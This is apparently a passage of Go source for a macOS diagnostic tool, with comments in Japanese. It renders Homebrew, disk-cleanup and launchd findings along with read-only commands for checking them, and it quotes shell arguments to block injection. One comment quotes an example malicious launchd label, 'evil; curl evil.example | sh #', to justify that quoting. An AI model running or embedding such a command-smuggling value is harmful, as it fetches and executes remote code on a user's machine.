				"        plutil -p " + svc.ShellQuote(u.PlistPath),
				"        ls -l " + svc.ShellQuote(u.PlistPath),
			},
			copyPath: u.PlistPath,
			copyText: svcUndiagnosedCopyText(u),
		})
	}
	if len(rep.Findings) == 0 && !undiagnosed {
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiDim, "   壊れた登録は見つかりませんでした")})
	}
	return rows
}

func (v *doctorView) brewSection(o doctorRenderOpts) []doctorRow {
	if v.brew == nil {
		return sectionHeader(o, "Homebrew", o.spinner+" brew doctor を実行中")
	}
	b := v.brew
	switch {
	case b.Unavailable != "":
		return append(sectionHeader(o, "Homebrew", "診断できず"), doctorRow{text: doctorColor(o.colored, ansiYellow, " 🚨 "+b.Unavailable)})
	case b.Clean:
		return append(sectionHeader(o, "Homebrew", "brew doctor: 警告なし"), doctorRow{text: doctorColor(o.colored, ansiDim, "   Your system is ready to brew.")})
	}
	rows := sectionHeader(o, "Homebrew", fmt.Sprintf("brew doctor: 警告 %d 件 (Enter で本文)", len(b.Warnings)))
	for i, w := range b.Warnings {
		lines := strings.Split(w, "\n")
		summary := strings.TrimSpace(strings.TrimPrefix(lines[0], "Warning:"))
		var detail []string
		for _, l := range lines[1:] {
			detail = append(detail, doctorColor(o.colored, ansiDim, "     "+l))
		}
		// 「Enter で何行出てくるか」の予告なので detail の行数をそのまま数える (見出しは既に見えているので
		// 数えない / 段落の空行は 1 行として表示されるので数える)。敵対レビュー 2026-09-03: 見出しを数えて
		// 空行を数えない中間形にすると、段落の数によって実際の展開行数と系統的にずれる。
		count := fmt.Sprintf("(%d 行)", len(detail))
		inner := o.width - 2
		sumW := dispWidth(summary)
		gap := inner - 3 - sumW - dispWidth(count) - 1
		text := "   " + doctorColor(o.colored, ansiYellow, summary)
		if gap >= 1 {
			text += padSpaces(gap) + doctorColor(o.colored, ansiDim, count)
		}
		rows = append(rows, doctorRow{text: text, selectable: true, key: fmt.Sprintf("brew:%d:%s", i, summary), detail: detail,
			copyPath: summary, copyText: "brew doctor の警告 (macOS Homebrew):\n" + w + "\n"})
	}
	return rows
}

// diskCopyPath は y でコピーする対象パス (複数なら改行区切り。ググる / ls する用)。
func diskCopyPath(r disk.Result) string {
	paths := make([]string, 0, len(r.Items))
	for _, it := range r.Items {
		paths = append(paths, it.Path)
	}
	return strings.Join(paths, "\n")
}

// diskCopyText は Y でコピーする解説文。別セッションの LLM に「これは消していいか」を聞ける形にする。
// diskVerifyCommands は「なぜこの候補が出たか」を人が自分で確かめるコマンド (issue 183)。
//
// なぜ要るか: `Y` のコピー文は「別セッションの LLM にそのまま投げられる形」と定義されている
// (issue 148 の ④ 追加要件)。判定・合計・復元方法だけ渡すと、受け手は**判定を鵜呑みにするしかない**。
//
// 🚨 **パスは必ず `svc.ShellQuote` を通す**。`Item.Path` も Container 名も攻撃者が置ける値で、
// 引用しないと doctor 自身が提示するコマンドがインジェクションを運ぶ (issue 178 / 193 が塞いだ穴を
// 新設することになる。`svc.manualCommands` が Label に対して同じ規律を持つ)。
//
// ⚠️ ここに**既存の出力と重複するコマンドを足さない**。`diskCopyText` は各 Item のサイズ・
// 最終更新・合計・`Contents` を既に出しているので、`du -sk` や `stat -f %Sm` は情報を増やさない
// (2026-09-03 の反証レビュー)。
// ⚠️ `orphan-container` に **`mdfind` を出さない**。カタログの Detail が
// 「Info.plist を実走査して突合 (mdfind は使わない)」と明記した手段で、
// 裏取り用でも載せると否定された判定材料を復活させる (同レビュー)。
func diskVerifyCommands(r disk.Result) []string {
	q := svc.ShellQuote
	switch r.Entry.ID {
	case "simulator-runtimes":
		return []string{"xcrun simctl runtime list -j"}
	case "coresimulator-orphan":
		// 出力の中に候補の UUID があれば現存 = 孤児ではない
		return []string{"xcrun simctl list devices -j"}
	case "orphan-container":
		return []string{"ls /Applications ~/Applications"}
	case "brew-orphan-state", "brew-cleanup-residue":
		// 実装の台帳は 1 つ (brewledger)。svc 側の C 判定と同じコマンドに揃える
		return []string{"brew list --formula", "brew cleanup --dry-run"}
	case "versionmanager-orphan-root":
		return []string{"echo $RBENV_ROOT $NODENV_ROOT $GOENV_ROOT", "rbenv root"}
	case "xctest-logarchive", "xctest-spindump", "launchd-tmp":
		// boottime より古いものだけを候補にしている。起動時刻を見れば判定を追える
		return []string{"sysctl kern.boottime"}
	case "finder-nsird", "swiftui-drag-cache":
		// どちらも「コピー元が残っているか」を人が見る必要がある (Recover がそう言っている)。
		// サイズではなく中身を見るので ls を出す
		var out []string
		for _, it := range r.Items {
			out = append(out, "ls -la "+q(it.Path))
			if len(out) >= maxVerifyCommands {
				break
			}
		}
		return out
	}
	return nil
}

// maxVerifyCommands はコピー文に載せる裏取りコマンドの上限 (Items が多いエントリで
// コピー文が読めない長さになるのを防ぐ)。
const maxVerifyCommands = 5

func diskCopyText(r disk.Result, mark string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "glogx doctor (ディスク診断) の候補: %s [%s]\n", r.Entry.Label, r.Entry.ID)
	fmt.Fprintf(&b, "判定: %s / 合計 %s / 削除経路: %s\n", mark, disk.HumanSize(r.Size), r.Entry.DeleteVia)
	fmt.Fprintf(&b, "復元方法: %s\n", r.Entry.Recover)
	if r.Entry.Detail != "" {
		fmt.Fprintf(&b, "補足: %s\n", r.Entry.Detail)
	}
	if r.Reason != "" {
		fmt.Fprintf(&b, "理由: %s\n", r.Reason)
	}
	for _, f := range r.Failures {
		fmt.Fprintf(&b, "走査できず: %s\n", f)
	}
	if len(r.Items) > 0 {
		b.WriteString("対象:\n")
		for _, it := range r.Items {
			fmt.Fprintf(&b, "  %s  %s", disk.HumanSize(it.Size), it.Path)
			if !it.Mtime.IsZero() {
				fmt.Fprintf(&b, "  (最終更新 %s)", it.Mtime.Format("2006-01-02"))
			}
			b.WriteString("\n")
		}
	}
	for _, c := range r.Contents {
		fmt.Fprintf(&b, "  中身: %s\n", c)
	}
	if cmds := diskVerifyCommands(r); len(cmds) > 0 {
		b.WriteString("この判定を自分で確かめるコマンド (読み取りのみ):\n")
		for _, c := range cmds {
			fmt.Fprintf(&b, "  %s\n", c)
		}
	}
	return b.String()
}

// svcUndiagnosedCopyText は Y でコピーする解説文 (判定できなかった登録)。
// 「診断できなかったので人が確かめてほしい」と言う以上、確かめる材料 (完全なパス・理由・裏取りコマンド) を渡す。
func svcUndiagnosedCopyText(u svc.Undiagnosed) string {
	var b strings.Builder
	b.WriteString("glogx doctor (サービス診断) が判定できなかった登録\n")
	fmt.Fprintf(&b, "plist: %s\n", u.PlistPath)
	fmt.Fprintf(&b, "理由: %s\n", u.Reason)
	b.WriteString("手動で確かめるコマンド (ツールは実行しない):\n")
	fmt.Fprintf(&b, "  plutil -p %s\n", svc.ShellQuote(u.PlistPath))
	fmt.Fprintf(&b, "  ls -l %s\n", svc.ShellQuote(u.PlistPath))
	return b.String()
}

// svcCopyText は Y でコピーする解説文 (壊れた launchd 登録)。
// svcVerifyCommands は壊れた登録の判定を人が確かめるコマンド (issue 183)。読み取りのみ。
//
// ⚠️ `f.Commands` (= `svc.manualCommands`) と混ぜない。あちらは `launchctl bootout` / `rm` の
// **破壊コマンド**で、「消してよいか確かめる」ためのものではない。コピー文では見出しを分ける。
//
// 🚨 パスと Label は `svc.ShellQuote` を通す (Label は plist が決める任意文字列で、
// `evil; curl evil.example | sh #` が実走査で成立する。`manualCommands` と同じ規律)。
// 🚨 ドメインは `f.Domain` を使う。`gui/$(id -u)/` の決め打ちは **system ドメインで誤り**
// (`svc.Annotations` が「system は launchctl list に出ない」と明記している)。
func svcVerifyCommands(f svc.Finding) []string {
	q := svc.ShellQuote
	out := []string{
		"plutil -p " + q(f.PlistPath),
		"launchctl print " + q(f.Domain+"/"+f.Label),
	}
	if f.MissingExec != "" { // A: 実行ファイルが本当に無いか
		out = append(out, "ls -l "+q(f.MissingExec))
	}
	if f.HasLastExit { // B: 起動状態を自分で見る
		out = append(out, "launchctl list | grep "+q(f.Label))
	}
	if f.BrewFormula != "" { // C: 台帳に無いか (実装の台帳と同じコマンド)
		out = append(out, "brew list --formula | grep "+q(f.BrewFormula))
	}
	return out
}

func svcCopyText(f svc.Finding) string {
	var b strings.Builder
	fmt.Fprintf(&b, "glogx doctor (サービス診断) の候補: %s\n", f.Label)
	fmt.Fprintf(&b, "plist: %s (ドメイン %s)\n", f.PlistPath, f.Domain)
	for _, r := range f.Reasons {
		fmt.Fprintf(&b, "理由: %s\n", r)
	}
	for _, a := range svc.Annotations(f) {
		fmt.Fprintf(&b, "注記: %s\n", a)
	}
	if f.MissingExec != "" {
		fmt.Fprintf(&b, "不在の実行ファイル: %s\n", f.MissingExec)
	}
	if f.BrewFormula != "" {
		fmt.Fprintf(&b, "Homebrew formula: %s\n", f.BrewFormula)
	}
	b.WriteString("この判定を自分で確かめるコマンド (読み取りのみ):\n")
	for _, c := range svcVerifyCommands(f) {
		fmt.Fprintf(&b, "  %s\n", c)
	}
	b.WriteString("消すと決めたら手動で実行するコマンド (ツールは実行しない):\n")
	for _, c := range f.Commands {
		fmt.Fprintf(&b, "  %s\n", c)
	}
	return b.String()
}
